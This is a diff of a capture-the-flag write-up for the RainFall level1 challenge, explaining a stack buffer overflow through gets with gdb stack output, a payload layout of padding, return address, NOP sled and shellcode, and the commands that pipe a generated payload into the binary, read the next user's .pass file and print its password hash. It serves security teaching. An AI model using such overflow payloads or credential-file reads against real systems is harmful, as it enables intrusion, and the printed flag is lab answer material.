@@ -1,32 +1,49 @@
-# This binary contains a simple main with a buffer and a call to gets.
+# This program makes a single call to gets with a buffer of 72 chars.
 # See the source code for a c implementation.
-# If we input the string 'AAAABBBBCCCCDDDD' after reaching the call to gets,
+# If we input the string 'AAAABBBBCCCCDDDD' when reaching the call to gets,
 # this is the state of the program's stack :
 
-(gdb) x/24wx $esp
-0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
-0xbffff6c0:	0x41414141	0x42424242	0x43434343	0x44444444 <== our input string
-0xbffff6d0:	0xb7fd1300	0x0000000d	0x0804978c	0x080484c1
-0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
-0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
-0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
+	(gdb) x/24wx $esp
+	0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
+	0xbffff6c0:	0x41414141	0x42424242	0x43434343	0x44444444 <== the input
+	0xbffff6d0:	0xb7fd1300	0x0000000d	0x0804978c	0x080484c1
+	0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+	0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
+	0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
+											^-- %ebp    ^-- return address of main
+	(gdb) i f
+	Stack level 0, frame at 0xbffff710:
+	 eip = 0x8048483 in main; saved eip 0xb7e454d3
+	 Arglist at 0xbffff708, args:
+	 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
+	 Saved registers:
+		ebp at 0xbffff708, eip at 0xbffff70c
 
-# As we can see, the buffer is declared on the stack, which means the program
-# is vulnerable to Return-Oriented Programming (ROP).
+# By reading man gets, we can find a warning in the bugs section.
+# There is no way of telling beforehand how many characters will be stored in
+# the buffer passed to gets.
+# Which means this program is vulnerable to Return-Oriented Programming (ROP).
 # The objective here is to overwrite the return address of the main function
-# by inputing a payload of the following structure :
-# (P stands for padding, A for address, N for the NOP sled and S for shellcode) :
+# located at the top of the initial stack frame by overflowing the buffer used
+# by gets.
+#
+# This trick will alter the flow of execution of the program which will jump
+# to a desired location instead of quitting as expected.
+# The term shellcode stands for a series of bytes encoding asm instructions
+# that, if interpreted, will invoke a shell.
+# The NOP sled is a series of NO_OP instructions, which do nothing.
+# It is there to ensure that the program doesn't segfault, from what I
+# understood because the ret instruction doesn't necessarily land where you'd
+# expect. The structure of the malicious string, or payload, is as follows :
 
-[72 bytes][4 bytes][4 bytes]   [>= 100 bytes][? bytes]
-[buffer]  [ebp]    [ret]	   [nopsled]	 [shellcode]
-[PPPPPPPPPPPPPPPPP][AAAA]	
-[AAAA...		  ][0xbffff7XX][NNNNNNNNNNNN][SSSSSSS]
-							|--------^
+	[72 bytes][4 bytes][4 bytes]   [>= 100 bytes][? bytes]
+	[buffer]  [ebp]    [ret]       [nopsled]     [shellcode]
+	[AAAAAAAAAAAAAAAAA][0xbffff7XX][\x90...     ][SSSSSSS]
+							  |--------^
 
-# The code for generating the payload is located in ./Resources/exploit.py.
 # Finally, the solution :
 
-level1@RainFall: python /tmp/exploit.py > /tmp/bad
-level1@RainFall:~$ cat /tmp/bad - | ./level1
-cat /home/user/$(whoami)/.pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+	level1@RainFall: python /tmp/exploit.py > /tmp/bad
+	level1@RainFall:~$ cat /tmp/bad - | ./level1
+	$ cat /home/user/$(whoami)/.pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
